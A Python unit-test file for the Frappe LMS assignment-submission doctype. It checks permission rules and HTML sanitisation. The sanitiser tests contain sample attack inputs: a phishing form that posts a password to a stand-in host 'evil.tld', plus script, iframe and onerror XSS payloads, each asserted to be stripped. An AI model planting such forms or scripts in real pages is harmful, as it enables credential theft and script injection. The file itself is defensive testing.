# Copyright (c) 2021, Frappe and Contributors
# See license.txt

import frappe

from lms.lms.test_helpers import BaseTestUtils


class TestLMSAssignmentSubmission(BaseTestUtils):
	def setUp(self):
		super().setUp()
		self.student_a = self._create_user("rtv.student.a@example.com", "Student", "Alpha", ["LMS Student"])
		self.student_b = self._create_user("rtv.student.b@example.com", "Student", "Bravo", ["LMS Student"])
		self.moderator = self._create_user("rtv.moderator@example.com", "Mod", "Erator", ["Moderator"])
		self.assignment = self._create_assignment()

	def tearDown(self):
		frappe.set_user("Administrator")
		super().tearDown()

	def _new_submission(self, member=None, answer="submission answer"):
		doc = frappe.new_doc("LMS Assignment Submission")
		doc.assignment = self.assignment.name
		if member is not None:
			doc.member = member
		doc.answer = answer
		return doc

	def test_student_cannot_submit_for_another_member(self):
		frappe.set_user(self.student_a.name)
		doc = self._new_submission(member=self.student_b.name)
		with self.assertRaises(frappe.PermissionError):
			doc.insert()

	def test_student_member_defaults_to_session_user(self):
		frappe.set_user(self.student_a.name)
		doc = self._new_submission(member=None)
		doc.insert()
		self.cleanup_items.append(("LMS Assignment Submission", doc.name))
		self.assertEqual(doc.member, self.student_a.name)

	def test_student_can_submit_for_self(self):
		frappe.set_user(self.student_a.name)
		doc = self._new_submission(member=self.student_a.name)
		doc.insert()
		self.cleanup_items.append(("LMS Assignment Submission", doc.name))
		self.assertEqual(doc.member, self.student_a.name)

	def test_privileged_user_can_submit_on_behalf_of_member(self):
		frappe.set_user(self.moderator.name)
		doc = self._new_submission(member=self.student_b.name)
		doc.insert()
		self.cleanup_items.append(("LMS Assignment Submission", doc.name))
		self.assertEqual(doc.member, self.student_b.name)

	def test_student_cannot_reassign_member_on_update(self):
		frappe.set_user(self.student_a.name)
		doc = self._new_submission(member=self.student_a.name)
		doc.insert()
		self.cleanup_items.append(("LMS Assignment Submission", doc.name))
		doc.member = self.student_b.name
		with self.assertRaises(frappe.PermissionError):
			doc.save()

	def test_privileged_user_can_reassign_member_on_update(self):
		frappe.set_user(self.moderator.name)
		doc = self._new_submission(member=self.student_a.name)
		doc.insert()
		self.cleanup_items.append(("LMS Assignment Submission", doc.name))
		doc.member = self.student_b.name
		doc.save()
		self.assertEqual(doc.member, self.student_b.name)

	# --- Form-control stripping (defence in depth; see lms/lms/html_sanitizer.py) ---
	#
	# Frappe's write-time allowlist keeps form/input/button, so a phishing form used
	# to reach the database intact and every non-SPA consumer -- notably the
	# "instructor left a comment" email, which mails `comments` as email_content --
	# rendered it live.

	PHISHING_FORM = (
		'<form action="https://evil.tld/steal" method="post">'
		'<input name="password" type="password"><button>Login</button></form>'
	)
	RICH_TEXT = (
		"<p><b>bold</b> <i>italic</i></p><ul><li>one</li></ul>"
		'<a href="https://ok">link</a><img src="/files/x.png"><h3>Heading</h3><br>'
	)

	def _graded_submission(self, **fields):
		doc = self._new_submission(member=self.student_a.name)
		doc.update(fields)
		doc.insert()
		return doc

	def _stored(self, doc, fieldname):
		return frappe.db.get_value("LMS Assignment Submission", doc.name, fieldname)

	# Ticket 68647 finding 2: frappe's allowlist keeps form controls, so a phishing
	# form stored intact and only the SPA dropped it -- not the notification email.
	def test_a_phishing_form_in_comments_is_not_stored(self):
		doc = self._graded_submission(comments=self.PHISHING_FORM, status="Pass")
		stored = self._stored(doc, "comments")
		for tag in ("<form", "<input", "<button"):
			self.assertNotIn(tag, stored)
		# The control is gone, the words it wrapped are not.
		self.assertIn("Login", stored)

	def test_a_phishing_form_in_the_answer_is_not_stored(self):
		doc = self._graded_submission(answer=self.PHISHING_FORM)
		stored = self._stored(doc, "answer")
		for tag in ("<form", "<input", "<button"):
			self.assertNotIn(tag, stored)

	def test_every_form_control_tag_is_stripped(self):
		markup = (
			"<fieldset><label>Name</label><textarea>note</textarea>"
			"<select><option>one</option></select></fieldset>"
		)
		doc = self._graded_submission(comments=markup, status="Pass")
		stored = self._stored(doc, "comments")
		for tag in ("<fieldset", "<label", "<textarea", "<select", "<option"):
			self.assertNotIn(tag, stored)
		self.assertIn("Name", stored)
		self.assertIn("note", stored)

	def test_legitimate_rich_text_survives(self):
		doc = self._graded_submission(comments=self.RICH_TEXT, status="Pass")
		stored = self._stored(doc, "comments")
		for markup in (
			"<b>bold</b>",
			"<i>italic</i>",
			"<ul>",
			"<li>one</li>",
			'href="https://ok"',
			'<img src="/files/x.png">',
			"<h3>Heading</h3>",
			"<br>",
		):
			self.assertIn(markup, stored)

	def test_sanitizing_the_same_value_twice_does_not_change_it(self):
		doc = self._graded_submission(comments=self.PHISHING_FORM + self.RICH_TEXT, status="Pass")
		after_first_save = self._stored(doc, "comments")
		doc.reload()
		doc.save()
		self.assertEqual(self._stored(doc, "comments"), after_first_save)

	def test_script_iframe_and_event_handlers_are_still_stripped(self):
		markup = (
			'<script>alert(1)</script><iframe src="https://evil.tld"></iframe><img src=x onerror=alert(1)>'
		)
		doc = self._graded_submission(comments=markup, status="Pass")
		stored = self._stored(doc, "comments")
		for tag in ("<script", "<iframe", "onerror"):
			self.assertNotIn(tag, stored)
